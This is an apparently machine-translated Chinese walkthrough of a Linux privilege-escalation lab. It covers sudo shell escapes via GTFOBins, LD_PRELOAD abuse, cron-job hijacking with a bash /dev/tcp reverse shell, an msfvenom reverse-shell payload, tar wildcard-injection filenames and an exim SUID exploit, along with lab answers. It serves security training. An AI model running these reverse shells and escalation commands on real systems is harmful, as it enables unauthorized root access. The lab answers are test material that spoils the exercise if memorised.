ki kj gt kk gh gi paragraph-image"><div role="button" tabindex="0" class="kl km di kn bf ko"><div class="gh gi nn"><img src="../Images/4c7de8e0b9052f169294a0716698186f.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*3d_9bK5UbKJeirLBpGQNTg.png"/></div></div></figure><p id="9768" class="pw-post-body-paragraph kw kx iq ky b kz la jr lb lc ld ju le lf lg lh li lj lk ll lm ln lo lp lq lr ij bi translated">使用root用户和新密码“pass123”通过SSH访问虚拟机</p><figure class="kg kh ki kj gt kk gh gi paragraph-image"><div class="gh gi oh"><img src="../Images/0979039b5b7b16bc19f6aaddde172019.png" data-original-src="https://miro.medium.com/v2/resize:fit:692/format:webp/1*5Y8lkj8VJIvPWt_rX-ALxg.png"/></div></figure><h1 id="ceff" class="ls lt iq bd lu lv lw lx ly lz ma mb mc jw md jx me jz mf ka mg kc mh kd mi mj bi translated">任务5:弱文件权限-可写/etc/passwd</h1><p id="880b" class="pw-post-body-paragraph kw kx iq ky b kz mk jr lb lc ml ju le lf mm lh li lj mn ll lm ln mo lp lq lr ij bi translated">/etc/passwd文件包含有关用户帐户的信息。它是全球可读的，但通常只有根用户可写。从历史上看,/etc/passwd文件包含用户密码散列，某些版本的Linux仍然允许在其中存储密码散列。</p><figure class="kg kh ki kj gt kk gh gi paragraph-image"><div role="button" tabindex="0" class="kl km di kn bf ko"><div class="gh gi mt"><img src="../Images/4838e2332e00368fe12ed8712ec5b214.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*4hhe5Iiy0PHTcYdvhi76ew.png"/></div></div></figure><h1 id="ad50" class="ls lt iq bd lu lv lw lx ly lz ma mb mc jw md jx me jz mf ka mg kc mh kd mi mj bi translated">任务6: Sudo -Shell转义序列</h1><p id="bd1a" class="pw-post-body-paragraph kw kx iq ky b kz mk jr lb lc ml ju le lf mm lh li lj mn ll lm ln mo lp lq lr ij bi translated">列出sudo允许您的用户运行的程序:</p><p id="30de" class="pw-post-body-paragraph kw kx iq ky b kz la jr lb lc ld ju le lf lg lh li lj lk ll lm ln lo lp lq lr ij bi translated"><code class="fe mp mq mr ms b">sudo -l</code></p><p id="72a6" class="pw-post-body-paragraph kw kx iq ky b kz la jr lb lc ld ju le lf lg lh li lj lk ll lm ln lo lp lq lr ij bi translated">访问GTFOBins(<a class="ae kv" href="https://gtfobins.github.io" rel="noopener ugc nofollow" target="_blank">https://GTFOBins . github . io</a>)，搜索一些程序名。如果程序列出了“sudo”作为一个函数，您可以使用它来提升权限，通常是通过转义序列。</p><p id="e712" class="pw-post-body-paragraph kw kx iq ky b kz la jr lb lc ld ju le lf lg lh li lj lk ll lm ln lo lp lq lr ij bi translated">从列表中选择一个程序，并按照GTFOBins的说明尝试获得一个根shell。</p><p id="448f" class="pw-post-body-paragraph kw kx iq ky b kz la jr lb lc ld ju le lf lg lh li lj lk ll lm ln lo lp lq lr ij bi translated">对于一个额外的挑战，尝试使用列表中的所有程序获得一个根shell！</p><p id="71ee" class="pw-post-body-paragraph kw kx iq ky b kz la jr lb lc ld ju le lf lg lh li lj lk ll lm ln lo lp lq lr ij bi translated"><strong class="ky ir">记得在继续之前退出根shell！</strong></p><p id="a1ea" class="pw-post-body-paragraph kw kx iq ky b kz la jr lb lc ld ju le lf lg lh li lj lk ll lm ln lo lp lq lr ij bi translated">“用户”可以通过sudo运行多少个程序？</p><figure class="kg kh ki kj gt kk gh gi paragraph-image"><div class="gh gi oi"><img src="../Images/37e1ac416c684dc5bd3fe71c0968f68b.png" data-original-src="https://miro.medium.com/v2/resize:fit:1308/format:webp/1*citspFoZr_9-ztgtFKBxBg.png"/></div></figure><blockquote class="mu mv mw"><p id="5f15" class="kw kx mx ky b kz la jr lb lc ld ju le my lg lh li mz lk ll lm na lo lp lq lr ij bi translated"><strong class="ky ir">答案:11 </strong></p></blockquote><p id="12e2" class="pw-post-body-paragraph kw kx iq ky b kz la jr lb lc ld ju le lf lg lh li lj lk ll lm ln lo lp lq lr ij bi translated"><strong class="ky ir">问题2: </strong>列表中的一个程序在GTFOBins上没有shell转义序列。到底是哪个？</p><blockquote class="mu mv mw"><p id="b445" class="kw kx mx ky b kz la jr lb lc ld ju le my lg lh li mz lk ll lm na lo lp lq lr ij bi translated"><strong class="ky ir">答案:apache2 </strong></p></blockquote><p id="c339" class="pw-post-body-paragraph kw kx iq ky b kz la jr lb lc ld ju le lf lg lh li lj lk ll lm ln lo lp lq lr ij bi translated"><strong class="ky ir">iftop</strong>(<a class="ae kv" href="https://gtfobins.github.io/gtfobins/iftop/" rel="noopener ugc nofollow" target="_blank">https://gtfobins.github.io/gtfobins/iftop/</a>)</p><pre class="kg kh ki kj gt nb ms nc nd aw ne bi"><span id="0016" class="nf lt iq ms b gy ng nh l ni nj">sudo iftop<br/>!/bin/sh</span></pre><p id="ba01" class="pw-post-body-paragraph kw kx iq ky b kz la jr lb lc ld ju le lf lg lh li lj lk ll lm ln lo lp lq lr ij bi translated">复制整个命令并粘贴它</p><figure class="kg kh ki kj gt kk gh gi paragraph-image"><div class="gh gi oj"><img src="../Images/dc728b77579de2f48dc9ca2f2f8222e4.png" data-original-src="https://miro.medium.com/v2/resize:fit:706/format:webp/1*PxaNOdMOQEW5XdyM6-oRKA.png"/></div></figure><p id="c60b" class="pw-post-body-paragraph kw kx iq ky b kz la jr lb lc ld ju le lf lg lh li lj lk ll lm ln lo lp lq lr ij bi translated"><strong class="ky ir">找到</strong>(<a class="ae kv" href="https://gtfobins.github.io/gtfobins/find/" rel="noopener ugc nofollow" target="_blank">https://gtfobins.github.io/gtfobins/find/</a>)</p><figure class="kg kh ki kj gt kk gh gi paragraph-image"><div class="gh gi ok"><img src="../Images/e8aa5a5617fc7370b0556a6ef5761b9d.png" data-original-src="https://miro.medium.com/v2/resize:fit:1058/format:webp/1*keWoDq3Mcw3udb9Lm4Y82g.png"/></div></figure><p id="66df" class="pw-post-body-paragraph kw kx iq ky b kz la jr lb lc ld ju le lf lg lh li lj lk ll lm ln lo lp lq lr ij bi translated"><strong class="ky ir">纳米</strong>(<a class="ae kv" href="https://gtfobins.github.io/gtfobins/nano/" rel="noopener ugc nofollow" target="_blank">https://gtfobins.github.io/gtfobins/nano/</a>)</p><pre class="kg kh ki kj gt nb ms nc nd aw ne bi"><span id="b66b" class="nf lt iq ms b gy ng nh l ni nj">sudo nano<br/>^R^X<br/>reset; sh 1&gt;&amp;0 2&gt;&amp;0</span></pre><figure class="kg kh ki kj gt kk gh gi paragraph-image"><div role="button" tabindex="0" class="kl km di kn bf ko"><div class="gh gi ol"><img src="../Images/07a9d6636315348a0bd2accf5bf2dc71.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*CRSL1LzLCH25flavN-tIZw.png"/></div></div></figure><p id="b5ef" class="pw-post-body-paragraph kw kx iq ky b kz la jr lb lc ld ju le lf lg lh li lj lk ll lm ln lo lp lq lr ij bi translated">维姆(<a class="ae kv" href="https://gtfobins.github.io/gtfobins/vim/" rel="noopener ugc nofollow" target="_blank">https://gtfobins.github.io/gtfobins/vim/</a>)T21</p><pre class="kg kh ki kj gt nb ms nc nd aw ne bi"><span id="9518" class="nf lt iq ms b gy ng nh l ni nj">sudo vim -c ':!/bin/bash'</span></pre><figure class="kg kh ki kj gt kk gh gi paragraph-image"><div role="button" tabindex="0" class="kl km di kn bf ko"><div class="gh gi om"><img src="../Images/d0bd7d9f8c2eff1a26c8d9c5397ecf5d.png" data-original-src="https://miro.medium.com/v2/resize:fit:864/format:webp/1*9KSablPHufes6R65pS7Jvw.png"/></div></div></figure><p id="e9f7" class="pw-post-body-paragraph kw kx iq ky b kz la jr lb lc ld ju le lf lg lh li lj lk ll lm ln lo lp lq lr ij bi translated"><strong class="ky ir">男人</strong>(<a class="ae kv" href="https://gtfobins.github.io/gtfobins/man/" rel="noopener ugc nofollow" target="_blank">https://gtfobins.github.io/gtfobins/man/</a>)</p><pre class="kg kh ki kj gt nb ms nc nd aw ne bi"><span id="b4c3" class="nf lt iq ms b gy ng nh l ni nj">sudo man man<br/>!/bin/bash</span></pre><figure class="kg kh ki kj gt kk gh gi paragraph-image"><div class="gh gi on"><img src="../Images/e2644d42d62980912539974f4cc93334.png" data-original-src="https://miro.medium.com/v2/resize:fit:648/format:webp/1*zTKLa_6x6gCqL3gZjdsKqg.png"/></div></figure><p id="3621" class="pw-post-body-paragraph kw kx iq ky b kz la jr lb lc ld ju le lf lg lh li lj lk ll lm ln lo lp lq lr ij bi translated"><strong class="ky ir">awk</strong>(<a class="ae kv" href="https://gtfobins.github.io/gtfobins/awk/" rel="noopener ugc nofollow" target="_blank">https://gtfobins.github.io/gtfobins/awk/</a>)</p><pre class="kg kh ki kj gt nb ms nc nd aw ne bi"><span id="bb4f" class="nf lt iq ms b gy ng nh l ni nj">sudo awk 'BEGIN {system("/bin/bash")}'</span></pre><figure class="kg kh ki kj gt kk gh gi paragraph-image"><div class="gh gi oo"><img src="../Images/4a3c4c636fd93f70f2e423d124f9cb3e.png" data-original-src="https://miro.medium.com/v2/resize:fit:1110/format:webp/1*S30O6zpIcnLYCHQceNa41w.png"/></div></figure><p id="35a7" class="pw-post-body-paragraph kw kx iq ky b kz la jr lb lc ld ju le lf lg lh li lj lk ll lm ln lo lp lq lr ij bi translated"><strong class="ky ir">少了</strong>(<a class="ae kv" href="https://gtfobins.github.io/gtfobins/less/" rel="noopener ugc nofollow" target="_blank">https://gtfobins.github.io/gtfobins/less/</a>)</p><pre class="kg kh ki kj gt nb ms nc nd aw ne bi"><span id="732c" class="nf lt iq ms b gy ng nh l ni nj">sudo less /etc/profile<br/>!/bin/sh</span></pre><figure class="kg kh ki kj gt kk gh gi paragraph-image"><div class="gh gi op"><img src="../Images/262b6c31c2cf95fc657e14734d5fb8db.png" data-original-src="https://miro.medium.com/v2/resize:fit:812/format:webp/1*-kFKEnfFL1jp8us6w7fR2A.png"/></div></figure><p id="75d8" class="pw-post-body-paragraph kw kx iq ky b kz la jr lb lc ld ju le lf lg lh li lj lk ll lm ln lo lp lq lr ij bi translated"><strong class="ky ir">FTP</strong>(<a class="ae kv" href="https://gtfobins.github.io/gtfobins/ftp/" rel="noopener ugc nofollow" target="_blank">https://gtfobins.github.io/gtfobins/ftp/</a>)</p><pre class="kg kh ki kj gt nb ms nc nd aw ne bi"><span id="1ef7" class="nf lt iq ms b gy ng nh l ni nj">sudo ftp<br/>!/bin/sh</span></pre><figure class="kg kh ki kj gt kk gh gi paragraph-image"><div class="gh gi oq"><img src="../Images/eb0657d69dd51655a85edbaa813448a7.png" data-original-src="https://miro.medium.com/v2/resize:fit:578/format:webp/1*lsrsSl0Ez05COCYwLPANpg.png"/></div></figure><p id="dafe" class="pw-post-body-paragraph kw kx iq ky b kz la jr lb lc ld ju le lf lg lh li lj lk ll lm ln lo lp lq lr ij bi translated"><strong class="ky ir">nmap</strong>(<a class="ae kv" href="https://gtfobins.github.io/gtfobins/nmap/" rel="noopener ugc nofollow" target="_blank">https://gtfobins.github.io/gtfobins/nmap/</a>)</p><p id="23ed" class="pw-post-body-paragraph kw kx iq ky b kz la jr lb lc ld ju le lf lg lh li lj lk ll lm ln lo lp lq lr ij bi translated">安装了Nmap 5.00，它具有交互模式:</p><pre class="kg kh ki kj gt nb ms nc nd aw ne bi"><span id="9f3b" class="nf lt iq ms b gy ng nh l ni nj">sudo nmap --interactive<br/>nmap&gt; !sh</span></pre><figure class="kg kh ki kj gt kk gh gi paragraph-image"><div class="gh gi or"><img src="../Images/3d7fb7e1d3b4ef5fe5be11f1fd7f7ea5.png" data-original-src="https://miro.medium.com/v2/resize:fit:1150/format:webp/1*u5JPvLEjbDfB0zMCgpb4kg.png"/></div></figure><h1 id="c7e1" class="ls lt iq bd lu lv lw lx ly lz ma mb mc jw md jx me jz mf ka mg kc mh kd mi mj bi translated">任务7: Sudo环境变量</h1><p id="693d" class="pw-post-body-paragraph kw kx iq ky b kz mk jr lb lc ml ju le lf mm lh li lj mn ll lm ln mo lp lq lr ij bi translated">正如演练所说，</p><blockquote class="mu mv mw"><p id="5908" class="kw kx mx ky b kz la jr lb lc ld ju le my lg lh li mz lk ll lm na lo lp lq lr ij bi translated"><em class="iq">程序运行时，LD_PRELOAD先加载一个共享对象</em></p></blockquote><p id="6487" class="pw-post-body-paragraph kw kx iq ky b kz la jr lb lc ld ju le lf lg lh li lj lk ll lm ln lo lp lq lr ij bi translated">这意味着我们可以创建一个共享对象(生成一个shell ),并在程序执行期间将它传递给这个环境变量(使用sudo作为根shell ),以便在实际程序被调用之前执行它</p><figure class="kg kh ki kj gt kk gh gi paragraph-image"><div role="button" tabindex="0" class="kl km di kn bf ko"><div class="gh gi os"><img src="../Images/efc4cc6e5b596e65151f2d2dee940a8f.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*LbfZUEM7hw00XVtdUSWVLA.png"/></div></div></figure><p id="98b9" class="pw-post-body-paragraph kw kx iq ky b kz la jr lb lc ld ju le lf lg lh li lj lk ll lm ln lo lp lq lr ij bi translated">是的，它甚至适用于其他库，这是由于利用源代码的性质</p><figure class="kg kh ki kj gt kk gh gi paragraph-image"><div role="button" tabindex="0" class="kl km di kn bf ko"><div class="gh gi ot"><img src="../Images/9c9c0b75c129f8965568d331671fb080.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*8u4BpLVAtbAyFXPHfo7FaQ.png"/></div></div></figure><p id="9742" class="pw-post-body-paragraph kw kx iq ky b kz la jr lb lc ld ju le lf lg lh li lj lk ll lm ln lo lp lq lr ij bi translated">细说起来，<code class="fe mp mq mr ms b">/home/user/tools/sudo/preload.c</code>的内容是</p><figure class="kg kh ki kj gt kk gh gi paragraph-image"><div class="gh gi ou"><img src="../Images/a977db4b1697f030521a27521f8499fa.png" data-original-src="https://miro.medium.com/v2/resize:fit:640/format:webp/1*ycwQcGRXd9WmUQQTC79bpA.png"/></div></figure><p id="b4d0" class="pw-post-body-paragraph kw kx iq ky b kz la jr lb lc ld ju le lf lg lh li lj lk ll lm ln lo lp lq lr ij bi translated">而<code class="fe mp mq mr ms b">/home/user/tools/sudo/library_path.c</code>的内容是</p><figure class="kg kh ki kj gt kk gh gi paragraph-image"><div class="gh gi ok"><img src="../Images/ef9cd4bdceef925b690d7af95cd228fe.png" data-original-src="https://miro.medium.com/v2/resize:fit:1058/format:webp/1*rcRZ7r5Ud0hSIYR4djTeaQ.png"/></div></figure><p id="d9fb" class="pw-post-body-paragraph kw kx iq ky b kz la jr lb lc ld ju le lf lg lh li lj lk ll lm ln lo lp lq lr ij bi translated">基本上，这些程序运行一个对<code class="fe mp mq mr ms b">/bin/bash</code>的系统调用来产生一个shell，因为我们用sudo运行它，我们得到一个根shell</p><p id="8f1c" class="pw-post-body-paragraph kw kx iq ky b kz la jr lb lc ld ju le lf lg lh li lj lk ll lm ln lo lp lq lr ij bi translated">这就是为什么进程独立于被调用的库</p><h1 id="6b82" class="ls lt iq bd lu lv lw lx ly lz ma mb mc jw md jx me jz mf ka mg kc mh kd mi mj bi translated">任务8: Cron作业-文件权限</h1><p id="2fb1" class="pw-post-body-paragraph kw kx iq ky b kz mk jr lb lc ml ju le lf mm lh li lj mn ll lm ln mo lp lq lr ij bi translated">所以我们看到<code class="fe mp mq mr ms b">overwrite.sh</code>每分钟都被执行</p><p id="b14e" class="pw-post-body-paragraph kw kx iq ky b kz la jr lb lc ld ju le lf lg lh li lj lk ll lm ln lo lp lq lr ij bi translated">哦，顺便说一句，如果你在阅读cron工作时间方面有困难，请访问crontab guru</p><p id="cad0" class="pw-post-body-paragraph kw kx iq ky b kz la jr lb lc ld ju le lf lg lh li lj lk ll lm ln lo lp lq lr ij bi translated">所以现在，我们可以通过在<code class="fe mp mq mr ms b">overwrite.sh</code>中编写我们的代码来连接到我们的本地机器，生成一个shell，当它被root用户执行时，我们将得到一个shell</p><p id="1f8b" class="pw-post-body-paragraph kw kx iq ky b kz la jr lb lc ld ju le lf lg lh li lj lk ll lm ln lo lp lq lr ij bi translated">在unix系统中，打开端口(或套接字？不确定)，是通过像访问文件一样访问<code class="fe mp mq mr ms b">/dev/</code>中的协议和端口完成的(如果我是对的，它被称为文件描述符)</p><p id="84ed" class="pw-post-body-paragraph kw kx iq ky b kz la jr lb lc ld ju le lf lg lh li lj lk ll lm ln lo lp lq lr ij bi translated">所以，我们的代码应该是</p><pre class="kg kh ki kj gt nb ms nc nd aw ne bi"><span id="dbd1" class="nf lt iq ms b gy ng nh l ni nj">#!/bin/bash<br/>bash -i &gt;&amp; /dev/tcp/10.2.12.26/4444 0&gt;&amp;1</span></pre><p id="1349" class="pw-post-body-paragraph kw kx iq ky b kz la jr lb lc ld ju le lf lg lh li lj lk ll lm ln lo lp lq lr ij bi translated"><strong class="ky ir">说明:</strong></p><ul class=""><li id="ef22" class="nr ns iq ky b kz la lc ld lf nt lj nu ln nv lr nw nx ny nz bi translated">第一行:shebang表示解释器，这里是bash</li><li id="1f3e" class="nr ns iq ky b kz oa lc ob lf oc lj od ln oe lr nw nx ny nz bi translated">第二行:<code class="fe mp mq mr ms b">bash -i</code>打开一个交互式shell，<code class="fe mp mq mr ms b">&gt;&amp; /dev/tcp/10.2.12.26/4444</code>将所有流重定向到我们的本地机器，<code class="fe mp mq mr ms b">0&gt;&amp;1</code>将<strong class="ky ir"> stdin </strong>和<strong class="ky ir"> stdout </strong>重定向到<strong class="ky ir"> stdout </strong></li></ul><p id="4f1f" class="pw-post-body-paragraph kw kx iq ky b kz la jr lb lc ld ju le lf lg lh li lj lk ll lm ln lo lp lq lr ij bi translated">因此，在编辑完<code class="fe mp mq mr ms b">overwrite.sh</code>中的代码后，我们在本地机器上监听，等待一个shell</p><figure class="kg kh ki kj gt kk gh gi paragraph-image"><div role="button" tabindex="0" class="kl km di kn bf ko"><div class="gh gi ov"><img src="../Images/ba40fa04009957ca1331b07c75eba875.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*XOERvzWEzNKbeQH9IPL-yQ.png"/></div></div></figure><figure class="kg kh ki kj gt kk gh gi paragraph-image"><div class="gh gi ow"><img src="../Images/dd88424c947fc7af78a5062cc0bb4c62.png" data-original-src="https://miro.medium.com/v2/resize:fit:1232/format:webp/1*eDIToZ3fowX55nAoffNOBA.png"/></div></figure><h1 id="1007" class="ls lt iq bd lu lv lw lx ly lz ma mb mc jw md jx me jz mf ka mg kc mh kd mi mj bi translated">任务9: Cron作业路径环境变量</h1><p id="669f" class="pw-post-body-paragraph kw kx iq ky b kz mk jr lb lc ml ju le lf mm lh li lj mn ll lm ln mo lp lq lr ij bi translated">查看系统范围的crontab的内容:</p><pre class="kg kh ki kj gt nb ms nc nd aw ne bi"><span id="545f" class="nf lt iq ms b gy ng nh l ni nj">cat /etc/crontab</span></pre><p id="394a" class="pw-post-body-paragraph kw kx iq ky b kz la jr lb lc ld ju le lf lg lh li lj lk ll lm ln lo lp lq lr ij bi translated">注意，PATH变量以/home/user开始，这是我们用户的主目录。</p><p id="9a2a" class="pw-post-body-paragraph kw kx iq ky b kz la jr lb lc ld ju le lf lg lh li lj lk ll lm ln lo lp lq lr ij bi translated">在您的主目录中创建一个名为overwrite.sh的文件，包含以下内容:</p><pre class="kg kh ki kj gt nb ms nc nd aw ne bi"><span id="a7a2" class="nf lt iq ms b gy ng nh l ni nj">#!/bin/bash</span><span id="737c" class="nf lt iq ms b gy ox nh l ni nj">cp /bin/bash /tmp/rootbash<br/>chmod +xs /tmp/rootbash</span></pre><p id="00f9" class="pw-post-body-paragraph kw kx iq ky b kz la jr lb lc ld ju le lf lg lh li lj lk ll lm ln lo lp lq lr ij bi translated">确保该文件是可执行的:</p><pre class="kg kh ki kj gt nb ms nc nd aw ne bi"><span id="1577" class="nf lt iq ms b gy ng nh l ni nj">chmod +x /home/user/overwrite.sh</span></pre><p id="364a" class="pw-post-body-paragraph kw kx iq ky b kz la jr lb lc ld ju le lf lg lh li lj lk ll lm ln lo lp lq lr ij bi translated">等待cron作业运行(不应超过一分钟)。使用-p运行/tmp/rootbash命令，获得以root权限运行的shell:</p><pre class="kg kh ki kj gt nb ms nc nd aw ne bi"><span id="e407" class="nf lt iq ms b gy ng nh l ni nj">/tmp/rootbash -p</span></pre><p id="c853" class="pw-post-body-paragraph kw kx iq ky b kz la jr lb lc ld ju le lf lg lh li lj lk ll lm ln lo lp lq lr ij bi translated">在继续之前，请记住删除修改后的代码，删除/tmp/rootbash可执行文件并退出提升的shell，因为您稍后将在房间中再次创建该文件！</p><pre class="kg kh ki kj gt nb ms nc nd aw ne bi"><span id="fd7e" class="nf lt iq ms b gy ng nh l ni nj">rm /tmp/rootbash<br/>exit</span></pre><figure class="kg kh ki kj gt kk gh gi paragraph-image"><div role="button" tabindex="0" class="kl km di kn bf ko"><div class="gh gi oy"><img src="../Images/4636b7c3610e5e606eaad377b3358e1d.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*jgPMnL1u6Mb3J7HYQH1GLA.png"/></div></div></figure><h1 id="9986" class="ls lt iq bd lu lv lw lx ly lz ma mb mc jw md jx me jz mf ka mg kc mh kd mi mj bi translated">任务10: Cron作业-通配符</h1><p id="5cbc" class="pw-post-body-paragraph kw kx iq ky b kz mk jr lb lc ml ju le lf mm lh li lj mn ll lm ln mo lp lq lr ij bi translated">查看其他cron作业脚本的内容:</p><p id="fd65" class="pw-post-body-paragraph kw kx iq ky b kz la jr lb lc ld ju le lf lg lh li lj lk ll lm ln lo lp lq lr ij bi translated"><code class="fe mp mq mr ms b">cat /usr/local/bin/compress.sh</code></p><p id="a6b9" class="pw-post-body-paragraph kw kx iq ky b kz la jr lb lc ld ju le lf lg lh li lj lk ll lm ln lo lp lq lr ij bi translated">请注意，tar命令是在您的主目录中使用通配符(*)运行的。</p><p id="2f8e" class="pw-post-body-paragraph kw kx iq ky b kz la jr lb lc ld ju le lf lg lh li lj lk ll lm ln lo lp lq lr ij bi translated">看看T21的GTFOBins页面。注意，tar有命令行选项，允许您运行其他命令作为检查点特性的一部分。</p><p id="900f" class="pw-post-body-paragraph kw kx iq ky b kz la jr lb lc ld ju le lf lg lh li lj lk ll lm ln lo lp lq lr ij bi translated">在你的Kali box上使用msfvenom生成一个反向shell ELF二进制。相应地更新LHOST IP地址:</p><p id="a519" class="pw-post-body-paragraph kw kx iq ky b kz la jr lb lc ld ju le lf lg lh li lj lk ll lm ln lo lp lq lr ij bi translated"><code class="fe mp mq mr ms b">msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.10.10 LPORT=4444 -f elf -o shell.elf</code></p><p id="4b83" class="pw-post-body-paragraph kw kx iq ky b kz la jr lb lc ld ju le lf lg lh li lj lk ll lm ln lo lp lq lr ij bi translated">将shell.elf文件传输到Debian VM上的<strong class="ky ir"> /home/user/ </strong>(您可以使用<strong class="ky ir"> scp </strong>或将文件托管在Kali box上的web服务器上，并使用<strong class="ky ir"> wget </strong>)。确保文件是可执行的:</p><figure class="kg kh ki kj gt kk gh gi paragraph-image"><div role="button" tabindex="0" class="kl km di kn bf ko"><div class="gh gi oz"><img src="../Images/8320a03e1abb48e4ed33d3d7002fce1c.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*oDaffa8ZIA6P8VSZi0ul_A.png"/></div></div></figure><p id="d3bf" class="pw-post-body-paragraph kw kx iq ky b kz la jr lb lc ld ju le lf lg lh li lj lk ll lm ln lo lp lq lr ij bi translated"><code class="fe mp mq mr ms b">chmod +x /home/user/shell.elf</code></p><p id="bf27" class="pw-post-body-paragraph kw kx iq ky b kz la jr lb lc ld ju le lf lg lh li lj lk ll lm ln lo lp lq lr ij bi translated">在/home/user中创建这两个文件:</p><p id="4047" class="pw-post-body-paragraph kw kx iq ky b kz la jr lb lc ld ju le lf lg lh li lj lk ll lm ln lo lp lq lr ij bi translated"><code class="fe mp mq mr ms b">touch /home/user/--checkpoint=1<br/>touch /home/user/--checkpoint-action=exec=shell.elf</code></p><figure class="kg kh ki kj gt kk gh gi paragraph-image"><div role="button" tabindex="0" class="kl km di kn bf ko"><div class="gh gi pa"><img src="../Images/a8fd9d50b66b5408ee07fb8dfb0997de.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*bzKa899oggi7jd7AiKqrCA.png"/></div></div></figure><p id="c9a5" class="pw-post-body-paragraph kw kx iq ky b kz la jr lb lc ld ju le lf lg lh li lj lk ll lm ln lo lp lq lr ij bi translated">当cron作业中的tar命令运行时，通配符(*)将扩展到包括这些文件。因为它们的文件名是有效的tar命令行选项，tar会识别它们，并把它们当作命令行选项而不是文件名。</p><p id="fb0c" class="pw-post-body-paragraph kw kx iq ky b kz la jr lb lc ld ju le lf lg lh li lj lk ll lm ln lo lp lq lr ij bi translated">在Kali box的4444端口上设置一个netcat监听器，并等待cron作业运行(不应该超过一分钟)。根shell应该连接回您的netcat监听器。</p><figure class="kg kh ki kj gt kk gh gi paragraph-image"><div class="gh gi pb"><img src="../Images/5a7ee616e75dd19abfc36c96a9885fd4.png" data-original-src="https://miro.medium.com/v2/resize:fit:1276/format:webp/1*f0bmOcBz8r8HQjjHW18WlA.png"/></div></figure><p id="ccf0" class="pw-post-body-paragraph kw kx iq ky b kz la jr lb lc ld ju le lf lg lh li lj lk ll lm ln lo lp lq lr ij bi translated"><code class="fe mp mq mr ms b">nc -nvlp 4444</code></p><p id="6bdc" class="pw-post-body-paragraph kw kx iq ky b kz la jr lb lc ld ju le lf lg lh li lj lk ll lm ln lo lp lq lr ij bi translated"><strong class="ky ir">记得退出根shell并删除您创建的所有文件，以防止cron作业再次执行:</strong></p><p id="2533" class="pw-post-body-paragraph kw kx iq ky b kz la jr lb lc ld ju le lf lg lh li lj lk ll lm ln lo lp lq lr ij bi translated"><code class="fe mp mq mr ms b">rm /home/user/shell.elf<br/>rm /home/user/--checkpoint=1<br/>rm /home/user/--checkpoint-action=exec=shell.elf</code></p><h1 id="a812" class="ls lt iq bd lu lv lw lx ly lz ma mb mc jw md jx me jz mf ka mg kc mh kd mi mj bi translated">任务11: SUID / SGID可执行文件-已知漏洞</h1><p id="bcfd" class="pw-post-body-paragraph kw kx iq ky b kz mk jr lb lc ml ju le lf mm lh li lj mn ll lm ln mo lp lq lr ij bi translated">在Debian虚拟机上找到所有的SUID/SGID可执行文件:</p><pre class="kg kh ki kj gt nb ms nc nd aw ne bi"><span id="3d4c" class="nf lt iq ms b gy ng nh l ni nj">find / -type f -a \( -perm -u+s -o -perm -g+s \) -exec ls -l {} \; 2&gt; /dev/null</span></pre><figure class="kg kh ki kj gt kk gh gi paragraph-image"><div role="button" tabindex="0" class="kl km di kn bf ko"><div class="gh gi pc"><img src="../Images/48cb6f3c09d3be18da844f65b3fe90db.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*e14EM0OxcnpnZt2MvnFFfg.png"/></div></div></figure><p id="3f8d" class="pw-post-body-paragraph kw kx iq ky b kz la jr lb lc ld ju le lf lg lh li lj lk ll lm ln lo lp lq lr ij bi translated">请注意,/ usr/sbin/exim-4.84–3出现在结果中。尝试查找此版本exim的已知漏洞。Exploit-DB、Google和GitHub是搜索的好地方！</p><p id="8ee0" class="pw-post-body-paragraph kw kx iq ky b kz la jr lb lc ld ju le lf lg lh li lj lk ll lm ln lo lp lq lr ij bi translated">应该可以利用与此版本的exim完全匹配的本地权限提升漏洞。可以在Debian VM的/home/user/tools/suid/exim/CVE-2016–1531 . sh上找到一份副本。</p><p id="6947" class="pw-post-body-paragraph kw kx iq ky b kz la jr lb lc ld ju le lf lg lh li lj lk ll lm ln lo lp lq lr ij bi translated">运行漏洞脚本以获得根外壳:</p><figure class="kg kh ki kj gt kk gh gi paragraph-image"><div class="gh gi pd"><img src="../Images/62681c2b73cce6608fdd9eb966c7c271.png" data-original-src="https://miro.medium.com/v2/resize:fit:1300/format:webp/1*G5gpeoi32OW8DOT6yfpqZA.png"/></div></figure><h1 id="1b5d" class="ls lt iq bd lu lv lw lx ly lz ma mb mc jw md jx me jz mf ka mg kc mh kd mi mj bi translated">任务12: SUID / SGID可执行文件-共享对象注入</h1><p id="54bb" class="pw-post-body-paragraph kw kx iq ky b kz mk jr lb lc ml ju le lf mm lh li lj mn ll lm ln mo lp lq lr ij bi translated">当我们运行<code class="fe mp mq mr ms b">/usr/local/bin/suid-so</code>(与共享对象有关的东西)时，它显示一个进度条，然后退出</p><p id="0950" class="pw-post-body-paragraph kw kx iq ky b kz la jr lb lc ld ju le lf lg lh li lj lk ll lm ln lo lp lq lr ij bi translated">所以我们运行一个<code class="fe mp mq mr ms b">strace /usr/local/bin/suid-so 2&gt;&amp;1 | grep -iE "open|access|no such file"</code>，看看是否有错误的配置或文件，我们可以改变，以利用这个可执行文件。</p><p id="7783" class="pw-post-body-paragraph kw kx iq ky b kz la jr lb lc ld ju le lf lg lh li lj lk ll lm ln lo lp lq lr ij bi translated">从输出来看，我们的目标是<code class="fe mp mq mr ms b">/home/user/.config/libcalc.so</code>,因为它不存在，我们有管理文件和文件夹的读写权限</p><p id="ea68" class="pw-post-body-paragraph kw kx iq ky b kz la jr lb lc ld ju le lf lg lh li lj lk ll lm ln lo lp lq lr ij bi translated">在编译和运行漏洞时，我们获得了根外壳访问权限</p><p id="b608" class="pw-post-body-paragraph kw kx iq ky b kz la jr lb lc ld ju le lf lg lh li lj lk ll lm ln lo lp lq lr ij bi translated">注意，可执行文件试图加载/home/user/。config/libcalc.so共享对象，但是找不到它。</p><p id="0a7f" class="pw-post-body-paragraph kw kx iq ky b kz la jr lb lc ld ju le lf lg lh li lj lk ll lm ln lo lp lq lr ij bi translated">创建。libcalc.so文件的配置目录:</p><pre class="kg kh ki kj gt 